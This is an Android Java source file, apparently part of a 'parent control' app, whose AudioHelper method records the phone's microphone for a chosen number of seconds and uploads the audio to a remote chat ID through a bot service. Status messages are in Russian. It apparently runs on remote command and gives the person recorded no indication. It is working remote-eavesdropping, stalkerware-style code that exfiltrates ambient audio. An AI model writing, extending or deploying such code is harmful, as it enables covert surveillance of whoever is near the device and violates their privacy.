package com.parentcontrol;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import java.io.File;
import okhttp3.OkHttpClient;

public class AudioHelper {
    public static void record(Context context, OkHttpClient client, String chatId, int seconds) {
        BotService service = (BotService) context;
        File file = new File(context.getCacheDir(), "audio.mp4");
        MediaRecorder recorder = null;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                recorder = new MediaRecorder(context);
            } else {
                recorder = new MediaRecorder();
            }
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(file.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            service.sendTextTo(chatId, "🎤 Запись началась (" + seconds + " сек)...");
            Thread.sleep(seconds * 1000L);
            recorder.stop();
            recorder.release();
            service.sendFile(file, "🎤 Аудио (" + seconds + " сек)", chatId);
        } catch (Exception e) {
            if (recorder != null) try { recorder.release(); } catch (Exception ignored) {}
            service.sendTextTo(chatId, "❌ Ошибка записи: " + e.getMessage());
        }
    }
}
